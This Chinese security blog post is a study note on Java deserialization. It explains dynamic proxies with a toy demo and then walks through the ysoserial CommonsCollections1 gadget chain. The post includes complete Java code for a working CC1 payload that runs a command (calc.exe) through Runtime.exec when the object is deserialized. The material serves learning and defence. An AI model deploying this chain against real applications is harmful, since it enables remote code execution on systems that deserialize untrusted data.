#  Java安全学习04-反序列化漏洞-动态代理-CC1链-入门   
原创 五流应用安全技师  NOVASEC   2022-08-27 16:32  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/toroKEibicmZDHAyRPdx2evZAaULMgb0aa1ZkO1QOOeLHkFT7SDSgVAvp2qHdPYN5VciaxttkXWuLG8xNmCcg6J6A/640?wx_fmt=jpeg "")  
  
  
真的 单单你的名字就够我爱一生了 --王小波  
  
  
  
**△△△点击上方“蓝字”关注我****们了解更多精彩**  
  
  
  
  
  
**0x00 免责声明**  
  
  
在学习本文技术或工具使用前，请您务必审慎阅读、充分理解各条款内容。  
  
  
1、本团队分享的任何类型技术、工具文章等文章仅面向合法授权的企业安全建设行为与个人学习行为，  
严禁任何组织或个人使用本团队技术或工具进行非法活动  
。  
  
  
2、在使用本文相关工具及技术进行测试时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。  
如您仅需要测试技术或工具的可行性，建议请自行搭建靶机环境，请勿对非授权目标进行扫描。  
  
  
3、如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。  
  
  
4、本团队目前未发起任  
何对外公开培训项目和其他对外收费项目，严禁任何组织或个人使用本团队名义进行非法盈利。  
  
  
5、本团队所有分享工具及技术文章，严禁不经过授权的公开分享。  
  
  
如果发现上述禁止行为，我们将保留追究您法律责任的权利，并由您自身承担由禁止行为造成的任何后果  
。  
  
  
  
**0x00 Preface**  
  
****  
本次笔记为ysoserial中的CC1，该方式前面与前一篇中的方式有差异，后面未有变化，这里有一些关于动态代理的使用，和一些套娃，理解起来比较困难，目前我只能说是一知半解，好在还有其它更好的方式，因此这里仅仅简单记录一下。  
  
  
本次笔记需要先看前一篇笔记  
  
  
  
  
  
**0x01 动态代理**  
  
动态代理简单介绍  
```
代理模式：
真实对象：被代理的对象
代理对象：就是代理对象
代理模式：代理对象 代理 真实对象，达到增强真实对象功能目的

实现方式：
动态代理：
1、代理对象和真实对象实现相同的接口
2、代理对象 = Proxy.newProxyInstance()
3、使用代理对象调用方法
4、增强方法
```  
  
  
为了给需要实现的方法添加后续操作，但是不干预实现类的正常业务，把一些基本业务和主要的业务逻辑分离。我们一般所熟知的Spring的AOP原理就是基于动态代理实现的。  
  
  
实现流程：  
  
使用proxy类里面的newProxyInstance方法创建代理对象  
```
static Object  newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h)  
返回指定接口的代理实例，该接口将方法调用分派给指定的调用处理程序。
```  
  
三个参数：  
  
ClassLoader loader：类加载器  
  
Class<?>[] interfaces：增强方法所在的类，这个类实现的接口，支持多个接口  
  
InvocationHandler：实现这个接口InvocationHandler，创建代理对象，写增强方法  
  
  
注意，InvocationHandler是一个接口，其中有一个方法invoke，我们需要实现这个接口，可以直接使用匿名内部类的方式，也可以单独在外边写一个类实现这个接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCgGzxibNdJctuaYa3mNKylicyEuoy5ZSJNrvbznice9GygCdV912NiaJZyTdsNHNOciaPZhPsvBWrkcjw/640?wx_fmt=png "")  
  
  
  
  
**0x02 动态代理demo**  
  
写一个代理商卖手机的demo  
  
  
接口  
```
package com.example.newyear.proxy;

public interface SalePhone {
    public String sale(double maney);

    public void show();
}
```  
  
  
真实类（官方直卖）  
```
package com.example.newyear.proxy;

/**
 * 真实类
 */

public class lenovo implements SalePhone{
    @Override
    public String sale(double maney) {
        System.out.println("花了"+maney+"买了一台电脑");
        return "lenove pc";
    }

    @Override
    public void show() {
        System.out.println("展示电脑....原价8000");
    }
}
```  
  
  
代理（代理商卖，进行打折之类的活动）  
```
package com.example.newyear.proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

/**
 * 代理测试类
 */
public class Proxytest {

    public static void main(String[] args) {
        //创建真实对象
        lenovo lno = new lenovo();

        //动态代理增强lno对象  底层：反射一个实现相同接口的类，这个新类的方法里面包含了对旧类方法的引用，使用这个新类实例化一个对象
        // 这个方法会返回一个代理对象
        // 固定写法  传入lno对象的类加载器和所有接口
        /**
         * 三个参数：
         *      1、类加载器：真实对象.getClass().getClassLoader()
         *      2、接口数组：真实对象.getClass().getInterfaces()  保证代理对象和真实对象实现了相同的接口
         *      3、处理器：new InvocationHandler() 核心业务的处理
         *
         * 因为代理对象和真实对象都是实现SalePhone接口，所以可以直接强转，方便阅读
         */
        SalePhone proxy_lno = (SalePhone) Proxy.newProxyInstance(lno.getClass().getClassLoader(), lno.getClass().getInterfaces(), new InvocationHandler() {
            /**
             *  代理逻辑里面写的方法：代理对象调用的所有方法都会触发该方法执行
             * @param proxy ：代理对象，就是上面的proxy_lno
             * @param method : 代理对象调用哪个方法，就会把哪个方法通过反射封装成对象传入
             * @param args ：代理对象调用的方法时，传递的实际参数
             * @return
             * @throws Throwable
             */
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
//                System.out.println("代理逻辑中的方法执行了");
//                System.out.println(method.getName());
//                System.out.println(args[0]);
                //代理对象只是增强真实对象的，因此这里面需要使用真实对象调用方法进行执行 而方法已经通过虚拟对象传入method中了
                //方法被真实对象执行
//                Object obj = method.invoke(lno, args);
                //使用真实对象调用方法执行后，返回的结果，这里return是给到代理对象，所以下面的pc=obj
//                return obj;

                //上面那部分需要好好理解，可以把注释去掉，运行进行理解，但是记得注释下面这部分

                //案例：比如供应商（代理对象），代理卖联想的电脑，卖出价格是进价的1.1
//                判断是否是sale方法,如果不是sale方法，就不会触发
                if (method.getName().equals("sale")){
                    //增强参数
                    double maney = (double) args[0];
                    maney = maney*1.1;
                    //增强方法体
                    System.out.println("客户");
                    Object obj = method.invoke(lno, maney);
                    System.out.println("客户血赚");
                    //增强返回值
                    return "因为"+obj+"送了鼠标";
                }else {
                    Object obj = method.invoke(lno, args);
                    return obj;
                }

            }
        });

        //使用代理对象调用真实类中的方法
        String pc = proxy_lno.sale(8000);
        System.out.println(pc);

//        proxy_lno.show();
    }
}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCgGzxibNdJctuaYa3mNKylicD8AJNGuHt95MYXQ08GX6QDhlre7lbjQhAKExib49CLyUq0oduYVcgDQ/640?wx_fmt=png "")  
  
  
下面为ysoserial中的CC1  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCgGzxibNdJctuaYa3mNKylicwkAXoY68EcTbwzsSzJ2uOvBOLgXD4CAgu8EU3Dia2jXichRVKAH868bA/640?wx_fmt=png "")  
  
  
  
**0x03**  
**LazyMap**  
  
****  
  
LazyMap中的get方法中有调用我们需要transform方法  
  
这里需要注意这个map，根据if语句，如果map中没有key，才会走到里面的transform方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCgGzxibNdJctuaYa3mNKylicq7oU0kaeXyRN7NdWdicoXW7SFVh7IicgYBull4b9nI1UNmYia39eaNcfA/640?wx_fmt=png "")  
  
  
  
跟进factory，是一个Transformer factory，只要传入chainedTransformer就能完成想要的链  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCgGzxibNdJctuaYa3mNKylicb2viaJGuVKv4xvxRwkSibeLnJheHvPmVDxCNNX1Vn8Q5IXibtvJXI5NEw/640?wx_fmt=png "")  
  
  
寻找哪里调用了get方法，get方法这个在非常多的类里面都会有，ysoserial中的CC1是在AnnotationInvocationHandler类的invoke方法里面调用了get方法  
  
  
  
  
**0x04**  
**AnnotationInvocationHandler**  
  
****  
AnnotationInvocationHandler类的invoke方法里面调用了get方法，其中的memberValues是可控的  
  
invoke方法是动态代理使用的方法，只要能搞一个AnnotationInvocationHandler的动态代理，就会触发  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCgGzxibNdJctuaYa3mNKylicvphcLle3Y6rXk1IpicER0QgsrFspDNIw0y96T2ClvIF017qEfqaZqicw/640?wx_fmt=png "")  
  
  
  
**0x05 终**  
  
这里需要对动态代理进行一些理解，动态代理知识多看几遍，而且这里进行了一些套娃  
  
注：这个方式深入的话，比较难理解，在debug模式下，序列化都会触发命令执行，但是正常模式则不会触发，正常模式下，反序列化最后AnnotationInvocationHandler对象时才会触发命令执行  
  
```
package com.yhsec.cctest.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyM = LazyMap.decorate(map, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aIC = c.getDeclaredConstructor(Class.class, Map.class);
        aIC.setAccessible(true);
        //这里为了能够触发AnnotationInvocationHandler的invoke方法(动态代理),所以需要一个InvocationHandler对象，AnnotationInvocationHandler是InvocationHandler的实现类，直接强转获得InvocationHandler对象
//        Object o = aIC.newInstance(Target.class, lazyM);
        InvocationHandler invocationHandler = (InvocationHandler) aIC.newInstance(Target.class, lazyM);

        //动态代理，因为AnnotationInvocationHandler接收一个Map参数，而LazyMap刚刚好实现了Map接口，所以这里代理Map接口
        // 这里是为了在进行动态代理的时候触发AnnotationInvocationHandler的invoke方法
       Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},invocationHandler);

       //这里是为了进行序列化反序列化，最外层,这个时候传入的上面动态代理获得的Map对象，AnnotationInvocationHandler套娃
        Object o = aIC.newInstance(Target.class, mapProxy);

        serialize(o);
        unserialize("src/main/resources/ser1.txt");


    }


    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("src/main/resources/ser1.txt"));
        oos.writeObject(obj);

    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        return o;

    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCgGzxibNdJctuaYa3mNKylicUPtn2Y2iasiaYkhia0CoZFibANv6WeEorGeBdxSUNmiacAqLnS79FSZokpQ/640?wx_fmt=png "")  
  
  
  
  
**0x06 Summary**  
  
其实我觉得，这个方式较为麻烦，我这里解释得也不太清楚，大家知道有这个方式就行，然后还有一个是动态代理，给开发提了漏洞后，他反馈修复方式为aop切面处理，可以简单理解为他写了一个过滤器。  
  
  
  
若有指教，请联系我，  
最后，谢谢  
阅读。  
  
  
END  
  
  
  
如您有任何  
投稿、  
问题、建议、需求、  
合作、请  
后台留言NOVASEC公众号！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCP3AeicSCQAYIOvxVDSRUxpiadmBKZ8gtggx02BmG1WwCqoM23l72qV8AiabXSRKjGmk8S1HS1nTjXw/640?wx_fmt=png "")  
  
或添  
加NOVASEC-余生   
以便于及时回复。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/toroKEibicmZA6GPNXvpIYDvZWwOG4354icIrcRZtjT713pjsXUbXqdicu1lTpJrG8cKADbSmn8gxwGrchm3pl1Gzw/640?wx_fmt=jpeg "微信图片_20201214143605.jpg")  
  
  
感谢大哥们的对NOVASEC的支持点赞和关注  
  
加入我们与萌新一起成长吧！  
  
  
**本团队任何技术及文件仅用于学习分享，请勿用于任何违法活动，感谢大家的支持！！**  
  
  
  
